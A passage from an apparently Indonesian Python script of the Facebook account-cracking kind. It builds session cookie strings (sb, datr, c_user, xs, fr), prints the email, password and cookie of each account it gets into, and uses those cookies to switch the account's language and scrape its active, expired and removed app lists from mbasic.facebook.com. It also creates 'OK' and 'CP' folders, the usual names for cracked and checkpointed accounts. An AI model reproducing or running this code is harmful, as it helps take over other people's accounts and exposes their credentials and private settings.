	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))


###---[ CEK APLIKASI ]---###
#--[ convert bahasa ]--#
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

#--[ pusat print ]--#
apk1, apk2, apk3 = [], [], []
def cek_apk(idf,pw,kuki):
	cookie = {"cookie" : kuki}
	language(cookie)
	akun = (f' [{hh}>{P}] Email  : {hh}{idf}{P}          \n [{hh}>{P}] Sandi  : {hh}{pw}          {P}\n [{hh}>{P}] Cookie : {hh}{kuki}{P}')
	try:		
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed"
		get_remove(url,cookie)
	except Exception as e:pass
	print('\r'+akun)
	if len(apk1)==0:pass
	else:
		akun = (f' [{hh}>{P}] Aplikasi Di Tambahkan :                     ')
		no = 0
		for apk in apk1:
			no += 1
			akun += (f'\n {P}[{hh}{no}{P}] {hh}{apk.lower()}            ')
		print('\r'+akun)
	if len(apk2)==0:pass
	else:
		akun = (f' {P}[{kk}>{P}] Aplikasi Kadaluwarsa :                   ')
		no = 0
		for apk in apk2:
			no += 1
			akun += (f'\n {P}[{kk}{no}{P}] {kk}{apk.lower()}             ')
		print('\r'+akun)
	if len(apk3)==0:pass
	else:
		akun = (f' {P}[{M}>{P}] Aplikasi Yang Di Hapus :                  ')
		no = 0
		for apk in apk3:
			no += 1
			akun += (f'\n {P}[{M}{no}{P}] {M}{apk.lower()}               ')
		print('\r'+akun)
	apk1.clear()
	apk2.clear()
	apk3.clear()
	print("\r                                             ")
			
			
#--[ cek apk aktif ]--#
def get_active(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Ditambahkan' in apk.text:					
				apk1.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_active(next,cookie)
	except:pass

#--[ cek apk kadaluarsa ]--#
def get_inactive(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Kedaluwarsa' in apk.text:
				apk2.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_inactive(next,cookie)
	except:pass

#--[ cek apk dihapus ]--#		
def get_remove(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Dihapus' in apk.text:
				apk3.append(f"{str(apk.text).replace('Dihapus',' Dihapus')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_remove(next,cookie)
	except:pass
	
def make():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('git pull')
	except:pass
	clear_layar()
	back()
	
	
if __name__=='__main__':
	make()	
